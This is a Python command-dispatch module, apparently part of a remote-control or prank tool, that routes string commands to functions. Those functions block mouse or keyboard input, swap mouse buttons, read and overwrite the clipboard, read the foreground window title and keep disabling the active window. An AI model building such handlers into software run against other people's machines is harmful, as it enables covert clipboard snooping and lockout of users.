from . import *
INVALID_COMMAND = "INVALID_COMMAND"

reverse_mouse_button_command = "reverse_mouse_button"
block_all_input = "block_all_input"
unblock_all_input = "unblock_all_input"
block_mouse = "block_mouse"
unblock_mouse = "unblock_mouse"
block_mouse_seconds = "block_mouse_seconds"
block_all_seconds = "block_all_seconds"
block_smart_seconds = "block_smart_seconds"
get_clipboard = "get_clipboard"
paste_to_clipboard = "paste_to_clipboard"
clipboard_filler = "clipboard_filler"
filler_off = "filler_off"
get_foreground_window_title = "get_foreground_window_title"
stop_disabler = "stop_disabler"
disable_current_windows_continous = "disable_current_windows_continous"
enable_current_window = "enable_current_window"
disable_current_window = "disable_current_window"

def get_result(command, args):
    if command == reverse_mouse_button_command:
        return reverse_mouse_button(*args)
    elif command == block_all_input:
        return block_input_obj.block_all(*args)
    elif command == unblock_all_input:
        return block_input_obj.unblock_all(*args)
    elif command == block_mouse:
        return block_input_obj.block_mouse(*args)
    elif command == unblock_mouse:
        return block_input_obj.unblock_mouse(*args)
    elif command == block_mouse_seconds:
        return block_input_obj.block_mouse_seconds(*args)
    elif command == block_all_seconds:
        return block_input_obj.block_all_seconds(*args)
    elif command == block_smart_seconds:
        return block_input_obj.block_smart_seconds(*args)

    elif command == get_clipboard:
        return Clipboard.get_text(*args)
    elif command == paste_to_clipboard:
        return Clipboard.copy_text(*args)
    elif command == clipboard_filler:
        return clipboard_obj.clipboard_filler(*args)
    elif command == filler_off:
        return clipboard_obj.filler_off(*args)

    elif command == disable_current_window:
        return window_obj.disable_current_window(*args)
    elif command == enable_current_window:
        return window_obj.enable_current_window(*args)
    elif command == disable_current_windows_continous:
        return window_obj.disable_current_windows_continous(*args)
    elif command == stop_disabler:
        return window_obj.stop_disabler(*args)
    elif command == get_foreground_window_title:
        return window_obj.get_foreground_window_title(*args)
    else: 
        return INVALID_COMMAND